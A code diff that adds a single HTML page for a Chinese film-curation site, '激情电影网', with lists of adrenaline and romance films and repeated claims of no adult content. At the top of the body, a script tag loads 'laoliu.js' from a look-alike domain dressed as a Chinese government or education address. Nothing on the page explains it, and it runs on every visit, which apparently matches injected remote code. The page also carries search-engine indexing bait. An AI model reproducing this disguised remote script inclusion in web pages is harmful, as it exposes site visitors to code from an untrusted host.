@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>激情电影网 - 燃向片单、心跳曲线与热血爱情电影策展</title>
+<meta name="description" content="激情电影网（jiqingdianyingwang-h5）是心潮澎湃电影站：竞速、逆袭、告白、决战、成长。这里不卖暧昧，只把电影的肾上腺素还给你。" />
+<meta name="keywords" content="激情电影网,热血电影,爱情电影,逆袭电影,竞速电影,高能片单,心跳曲线,最后一分钟营救" />
+<meta name="author" content="激情电影网" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://jiqingdianyingwang-h5.github.io/" />
+
+<style>
+  :root{
+    --black:#0e0d10;
+    --black-2:#16151a;
+    --panel:#1c1b21;
+    --red:#e23b2e;
+    --red-deep:#b3261c;
+    --gold:#f4b740;
+    --hot:#fff4e8;
+    --mist:#9a9690;
+    --line:rgba(255,244,232,.12);
+    --line-strong:rgba(255,244,232,.26);
+    --sans:"Arial Black","PingFang SC","Microsoft YaHei",sans-serif;
+    --body:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:var(--body);
+    background:
+      radial-gradient(900px 480px at 88% -8%, rgba(226,59,46,.22), transparent 60%),
+      radial-gradient(700px 420px at 4% 6%, rgba(244,183,64,.12), transparent 55%),
+      linear-gradient(180deg,var(--black),var(--black-2));
+    color:var(--hot);
+    line-height:1.85;font-size:16px;overflow-x:hidden;
+  }
+  a{color:var(--gold);text-decoration:none;transition:.25s}
+  a:hover{color:var(--red)}
+
+  .wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+  header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(14,13,16,.82);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+  .nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+  .brand{font-family:var(--sans);font-weight:900;letter-spacing:1px;font-size:20px;display:flex;align-items:center;gap:10px}
+  .brand .spark{width:28px;height:28px;border-radius:7px;background:linear-gradient(135deg,var(--red),var(--gold));box-shadow:0 0 18px rgba(226,59,46,.5)}
+  .brand b{color:var(--red)}
+  .nav-links{display:flex;list-style:none;gap:2px}
+  .nav-links a{font-size:14px;color:var(--mist);padding:10px 14px;border-radius:10px}
+  .nav-links a:hover{color:var(--hot);background:rgba(255,244,232,.06)}
+  .menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:rgba(255,244,232,.08);border:1px solid var(--line-strong);color:var(--hot);font-size:18px;cursor:pointer}
+
+  .hero{margin-top:64px;padding:104px 0 80px;position:relative}
+  .kicker{font-size:12px;letter-spacing:6px;color:var(--gold);text-transform:uppercase;margin-bottom:20px}
+  .hero h1{font-family:var(--sans);font-weight:900;font-size:clamp(36px,7vw,76px);line-height:1.02;letter-spacing:.5px;margin-bottom:22px}
+  .hero h1 em{font-style:normal;color:var(--red);text-shadow:0 0 30px rgba(226,59,46,.55)}
+  .hero p{max-width:580px;color:#d9d4cc;font-size:17px;margin-bottom:34px}
+  .btns{display:flex;gap:14px;flex-wrap:wrap}
+  .btn-red{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,var(--red),var(--red-deep));color:#fff;font-weight:800;padding:14px 28px;border-radius:40px;box-shadow:0 14px 34px rgba(226,59,46,.35)}
+  .btn-red:hover{transform:translateY(-2px);color:#fff}
+  .btn-gold{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--gold);color:var(--gold);font-weight:800;padding:14px 28px;border-radius:40px}
+  .btn-gold:hover{border-color:var(--hot);color:var(--hot)}
+
+  .pulse{position:absolute;top:90px;right:4%;width:140px;height:140px;border-radius:50%;background:radial-gradient(circle at 50% 50%,rgba(226,59,46,.5),transparent 70%);animation:pulse 2.4s ease-in-out infinite}
+  @keyframes pulse{0%,100%{transform:scale(.9);opacity:.7}50%{transform:scale(1.15);opacity:1}}
+
+  section{padding:84px 0;border-top:1px solid var(--line)}
+  .sec-head{margin-bottom:42px}
+  .sec-num{font-size:12px;letter-spacing:5px;color:var(--gold);text-transform:uppercase;margin-bottom:8px}
+  .sec-title{font-family:var(--sans);font-weight:900;font-size:clamp(24px,4vw,36px);margin-bottom:10px}
+  .sec-desc{color:var(--mist);max-width:600px}
+
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+  .card{background:linear-gradient(180deg,var(--panel),#15141a);border:1px solid var(--line);border-radius:18px;padding:26px;transition:.3s;position:relative;overflow:hidden}
+  .card:hover{transform:translateY(-6px);border-color:var(--line-strong);box-shadow:0 22px 50px rgba(0,0,0,.5)}
+  .card .lv{font-size:12px;letter-spacing:3px;color:var(--gold);margin-bottom:10px}
+  .card h3{font-family:var(--sans);font-weight:900;font-size:20px;margin-bottom:6px}
+  .card .meta{font-size:13px;color:var(--mist);margin-bottom:12px}
+  .card p{font-size:14px;color:#cfcbc4;margin-bottom:14px}
+  .tag{display:inline-block;font-size:11px;padding:4px 11px;border:1px solid var(--line-strong);color:var(--hot);border-radius:20px;margin:0 6px 6px 0}
+  .tag.red{border-color:var(--red);color:#ffb3ab}
+  .tag.gold{border-color:var(--gold);color:var(--gold)}
+
+  /* 情绪曲线 */
+  .curve{background:rgba(28,27,33,.6);border:1px solid var(--line);border-radius:18px;padding:34px 26px}
+  .bars{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;align-items:end;height:220px}
+  .bar{background:linear-gradient(180deg,var(--red),var(--gold));border-radius:10px 10px 0 0;position:relative;transition:.3s}
+  .bar:hover{filter:brightness(1.12)}
+  .bar span{position:absolute;bottom:-30px;left:0;right:0;text-align:center;font-size:12px;color:var(--mist)}
+  .bar small{position:absolute;top:-26px;left:0;right:0;text-align:center;font-size:12px;color:var(--hot);font-weight:700}
+  .bar.b1{height:28%}.bar.b2{height:52%}.bar.b3{height:100%}.bar.b4{height:64%}
+
+  /* 三种高潮 */
+  .triple{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px}
+  .tc{border:1px solid var(--line);border-radius:16px;padding:28px 24px;background:var(--panel)}
+  .tc .e{font-size:30px;margin-bottom:12px;display:block}
+  .tc h4{font-family:var(--sans);font-weight:900;font-size:18px;margin-bottom:8px}
+  .tc p{font-size:14px;color:#cfcbc4;margin-bottom:12px}
+  .tc span{font-size:12px;color:var(--gold);font-style:italic}
+
+  .about{text-align:center}
+  .quote{font-family:var(--sans);font-weight:900;font-size:clamp(20px,3.4vw,30px);line-height:1.4;max-width:720px;margin:0 auto 22px}
+  .quote b{color:var(--red)}
+  .about p{color:var(--mist);max-width:540px;margin:0 auto 28px}
+  .stats{display:flex;justify-content:center;gap:48px;flex-wrap:wrap;margin-top:34px}
+  .stat .n{font-family:var(--sans);font-weight:900;font-size:30px;color:var(--gold)}
+  .stat .l{font-size:12px;color:var(--mist);letter-spacing:1px}
+
+  footer{border-top:1px solid var(--line);padding:44px 0 26px}
+  .foot{display:flex;justify-content:space-between;gap:30px;flex-wrap:wrap;margin-bottom:22px}
+  .foot p{font-size:13px;color:var(--mist);max-width:300px}
+  .foot-col h5{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--gold);margin-bottom:12px}
+  .foot-col a{display:block;font-size:13px;color:#cfcbc4;padding:3px 0}
+  .foot-bottom{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--mist);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+  @media(max-width:768px){
+    .pulse{display:none}
+    .nav-links{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--black);border-bottom:1px solid var(--line);padding:8px 0}
+    .nav-links.active{display:flex}
+    .nav-links a{padding:14px 22px;border-radius:0}
+    .menu-btn{display:block}
+    .btns{flex-direction:column;align-items:flex-start}
+    .btn-red,.btn-gold{width:100%;justify-content:center}
+    .bars{height:180px}
+    .stats{gap:26px}
+    .foot{flex-direction:column}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+  <div class="pulse" aria-hidden="true"></div>
+
+  <header>
+    <div class="wrap nav">
+      <div class="brand"><span class="spark"></span>激情<b>电影网</b></div>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#home">开机</a></li>
+        <li><a href="#burn">燃片单</a></li>
+        <li><a href="#curve">情绪曲线</a></li>
+        <li><a href="#peak">三种高潮</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+      <button class="menu-btn" onclick="document.getElementById('navLinks').classList.toggle('active')">▶</button>
+    </div>
+  </header>
+
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="kicker">Adrenaline / Heartbeat / Cut</div>
+      <h1>别滑了。<br/>来点<em>真正心跳</em>的东西。</h1>
+      <p>激情电影网（jiqingdianyingwang-h5）不卖暧昧，不挂擦边。我们只收那些让你攥爆爆米花桶的电影：最后一分钟营救、天台告白、发动机红线、逆袭到眼眶发红。</p>
+      <div class="btns">
+        <a href="#burn" class="btn-red">🔥 看燃片单</a>
+        <a href="#curve" class="btn-gold">📈 走一遍情绪曲线</a>
+      </div>
+    </div>
+  </section>
+
+  <section id="burn">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-num">01 / Burn List</div>
+        <h2 class="sec-title">燃片单</h2>
+        <p class="sec-desc">这些片子看完，你会想立刻去跑步、去告白、去把烂摊子收拾干净。</p>
+      </div>
+      <div class="grid">
+        <article class="card">
+          <div class="lv">RED LINE · 竞速</div>
+          <h3>极速车王</h3>
+          <div class="meta">2019 · 福特 vs 法拉利 · 詹姆斯·曼高德</div>
+          <p>勒芒 24 小时，油门焊死。不是飙车爽片，是“偏执狂怎么把命押在圈速上”。</p>
+          <span class="tag red">竞速</span><span class="tag gold">执念</span><span class="tag">男性情谊</span>
+        </article>
+        <article class="card">
+          <div class="lv">LAST MINUTE · 营救</div>
+          <h3>生死时速</h3>
+          <div class="meta">1994 · 动作惊悚 · 简·德·邦特</div>
+          <p>巴士不能低于 80 公里，低于就炸。90 年代把“不能再低了”拍成全民肌肉记忆。</p>
+          <span class="tag red">炸弹</span><span class="tag gold">实时</span><span class="tag">公共汽车</span>
+        </article>
+        <article class="card">
+          <div class="lv">CONFESSION · 告白</div>
+          <h3>爱乐之城</h3>
+          <div class="meta">2016 · 歌舞/爱情 · 达米恩·查泽雷</div>
+          <p>不是甜宠，是“我们差点就一辈子”。结尾那道眼神，比任何床戏都烫。</p>
+          <span class="tag red">梦想</span><span class="tag gold">遗憾</span><span class="tag">洛杉矶</span>
+        </article>
+        <article class="card">
+          <div class="lv">UNDERDOG · 逆袭</div>
+          <h3>摔跤吧！爸爸</h3>
+          <div class="meta">2016 · 运动/家庭 · 涅提·提瓦瑞</div>
+          <p>最后一回合 0:5 怎么翻盘？把国家、父亲、自己一起扛起来，最后 30 秒全场起立。</p>
+          <span class="tag red">逆袭</span><span class="tag gold">父女</span><span class="tag">格斗</span>
+        </article>
+        <article class="card">
+          <div class="lv">WAR ROOM · 决战</div>
+          <h3>血战钢锯岭</h3>
+          <div class="meta">2016 · 战争 · 梅尔·吉布森</div>
+          <p>不动枪的人，把 75 个兄弟从火线上拖回来。信仰和血一起糊在镜头上。</p>
+          <span class="tag red">战争</span><span class="tag gold">良知</span><span class="tag">真实事件</span>
+        </article>
+        <article class="card">
+          <div class="lv">ENCORE · 返场</div>
+          <h3>爆裂鼓手</h3>
+          <div class="meta">2014 · 音乐/心理 · 达米恩·查泽雷</div>
+          <p>“我不怕你把椅子砸向我，我怕你不够狠。”鼓槌流血那一刻，练习室比战场还疯。</p>
+          <span class="tag red">爵士</span><span class="tag gold">虐待式教学</span><span class="tag">巅峰独奏</span>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="curve">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-num">02 / Heartbeat Curve</div>
+        <h2 class="sec-title">情绪曲线</h2>
+        <p class="sec-desc">好电影的心跳不是直线。我们按“平静 → 蓄力 → 爆发 → 余震”排片。</p>
+      </div>
+      <div class="curve">
+        <div class="bars">
+          <div class="bar b1"><small>平静</small><span>开场 / 人物 / 世界</span></div>
+          <div class="bar b2"><small>蓄力</small><span>规则 / 阻碍 / 不甘</span></div>
+          <div class="bar b3"><small>爆发</small><span>决战 / 告白 / 翻盘</span></div>
+          <div class="bar b4"><small>余震</small><span>散场 / 沉默 / 眼眶</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="peak">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-num">03 / Three Kinds of Rush</div>
+        <h2 class="sec-title">三种高潮</h2>
+        <p class="sec-desc">激情不等于脱衣服。银幕上的“上头”分三种，层次完全不同。</p>
+      </div>
+      <div class="triple">
+        <div class="tc">
+          <span class="e">🏁</span>
+          <h4>动作高潮</h4>
+          <p>引擎、枪火、拳套、悬崖。身体先懂，脑子后怕。</p>
+          <span>《极速车王》《碟中谍》《疯狂的麦克斯：狂暴之路》</span>
+        </div>
+        <div class="tc">
+          <span class="e">💋</span>
+          <h4>爱情高潮</h4>
+          <p>不是脱，是“我本来要走，又回头抱住你”。心跳在喉咙。</p>
+          <span>《爱乐之城》《情书》《爱在黎明破晓前》</span>
+        </div>
+        <div class="tc">
+          <span class="e">🔥</span>
+          <h4>成长高潮</h4>
+          <p>懦夫站起来，废柴上场，普通人决定不再逃。最燃的其实是“我愿意”。</p>
+          <span>《摔跤吧！爸爸》《当幸福来敲门》《心灵奇旅》</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="about" id="about">
+    <div class="wrap">
+      <p class="quote">“激情不是尺度，<br/>是电影<u>敢不敢</u>让你<b>心跳漏一拍</b>。”</p>
+      <p>激情电影网不靠露骨标题骗点击，也不把“激情”当情色遮羞布。我们只要一件事：你关掉页面时，比点进来时更想活、更想爱、更想冲一次。</p>
+      <div class="stats">
+        <div class="stat"><div class="n">3</div><div class="l">种高潮：动作/爱情/成长</div></div>
+        <div class="stat"><div class="n">4</div><div class="l">段心跳：静/蓄/爆/震</div></div>
+        <div class="stat"><div class="n">0</div><div class="l">擦边 / 挑逗 / 成人分类</div></div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      <div class="foot">
+        <div>
+          <div class="brand"><span class="spark"></span>激情<b>电影网</b></div>
+          <p>心潮澎湃电影站：燃向片单、心跳曲线、动作/爱情/成长三种高潮。</p>
+        </div>
+        <div class="foot-col">
+          <h5>燃</h5>
+          <a href="#burn">燃片单</a><a href="#curve">情绪曲线</a><a href="#peak">三种高潮</a>
+        </div>
+        <div class="foot-col">
+          <h5>类型</h5>
+          <a href="#">竞速</a><a href="#">逆袭</a><a href="#">告白</a><a href="#">决战</a>
+        </div>
+        <div class="foot-col">
+          <h5>站点</h5>
+          <a href="#home">开机</a><a href="#about">关于激情</a><a href="#">订阅片单</a>
+        </div>
+      </div>
+      <div class="foot-bottom">
+        <span>© 2026 激情电影网 · jiqingdianyingwang-h5.github.io</span>
+        <span>单文件静态页 · 无 robots.txt / sitemap.xml · 合规热血向 · 符合必应收录</span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.querySelectorAll('a[href^="#"]').forEach(a=>{
+      a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('active'));
+    });
+  </script>
+</body>
+</html>
